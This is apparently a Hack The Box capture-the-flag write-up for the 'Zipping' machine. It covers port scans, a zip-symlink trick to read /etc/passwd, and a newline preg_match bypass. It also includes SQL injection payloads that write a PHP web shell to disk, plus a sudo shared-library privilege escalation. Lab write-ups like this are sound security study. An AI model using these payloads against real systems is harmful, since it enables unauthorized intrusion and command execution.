---
title: Zipping Report
date: 2023-09-14 12:00:00 pm
categories: [HTB]
tags: [HTB, Linux, Medium, SQLI, RCE, LFI, Bash Scripting, Python Scripting]

img_path: /assets/img/htb/writeups/zipping
---

## **Information gathering**

* * *
* * *

**Scope:** 10.10.11.229/32 (Linux)

**TCP Nmap scan:** 65,535 ports

* **Open ports**:
	* 22/ssh:
		* Banner grabbing
			- Version: OpenSSH_9.0p1 Ubuntu-1ubuntu7.3
				* [OpenSSH 9.4](https://www.openssh.com/txt/release-9.4)/[9.4p1](https://www.openssh.com/txt/release-9.4) (2023-08-10)
			- Codename: kinetic [codename.py](https://github.com/E1P0TR0/CVE-Machines_htb/blob/main/testing_tools/codename.py)
			- CVEs Version: [https://nvd.nist.gov/vuln/search/results?form_type=Advanced&cves=on&cpe_version=cpe:/a:openbsd:openssh:9.0p1](https://nvd.nist.gov/vuln/search/results?form_type=Advanced&cves=on&cpe_version=cpe:/a:openbsd:openssh:9.0p1)
	* 80/http:
		* Banner grabbing
			* Server: Apache/2.4.54 (Ubuntu)
			* Firefox
				![](firefox_interface.png)
			* Technologies
				* Programming Languages: PHP
				* JavaScript libraries: Jquery 3.4.1
			* Basic url scrapping
				![](url_scrapping_curl.png)
				* http://10.10.11.229/upload.php
					* Description: The application will only **accept zip files, inside them there must be a pdf file** containing your curriculum.
				* http://10.10.11.229/shop
					* Description: Zipping watching store (**Basic LFI vulnerable** [page]) [only .php files]

## **Vulnerability Assesment**

* * *
* * *

* http://10.10.11.229/upload.php (ZIP automatically decompressed upload)
	* [https://book.hacktricks.xyz/pentesting-web/file-upload#zip-tar-file-automatically-decompressed-upload](https://book.hacktricks.xyz/pentesting-web/file-upload#zip-tar-file-automatically-decompressed-upload)
		![](zip_symlinks_ht.png)
		* Steps:
			* ln -rs /etc/passwd reader.pdf
			* zip --symlinks reader.zip reader.pdf
			![](zip_lfi_pdf.png)
* Code analisys
	* (/shop/cart.php)
		![](cart_php.png)
		* preg_match: To bypass this check you could **send the value with new-lines urlencoded** (`%0A`) [https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#preg_match-.](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#preg_match-.)
	* (/shop/index.php)
		![](index_php.png)
		* We can include any .php file in "page" parameter
	* Create phpinfo file in a directory with permissions and read it
		* Payload: ';select+'\<?php+phpinfo(); ?>'+into+outfile+'/var/lib/mysql/phpinfo.php';#1
			![](sqli_poc.png)
			![](sqli_out.png)

## **Exploitation**

* * *
* * *

* rektsu RCE
	* Payload: %0a';select '\<?php system($\_GET\["cmd"]); ?>' into outfile '/var/lib/mysql/rce_poc.php';#1
		![](rce_poc.png)

## **Post-exploitation**

* * *
* * *

* Rekztu user
	* Sudo binary without password (/usr/bin/stock)
		* Shared Libraries [https://tbhaxor.com/understanding-concept-of-shared-libraries/](https://tbhaxor.com/understanding-concept-of-shared-libraries/)
			![](lib_call.png)
			![](root.png)

## **Lateral movement**

* * *
* * *

## **Proof of concept**

* * *
* * *

* http://10.10.11.229/upload.php (ZIP automatically decompressed upload)
	* Bash script (zip_reader.sh)
		![](zip_lfi_poc.png)
* http://10.10.11.229/shop/cart.php & http://10.10.11.229/shop/index.php?page (SQLI and PHP include)
	* Python script
		![](sqli_rce_poc.png)
* Repository scripts [https://github.com/E1P0TR0/CVE-Machines_htb/tree/main/Auto-tools_Zipping](https://github.com/E1P0TR0/CVE-Machines_htb/tree/main/Auto-tools_Zipping)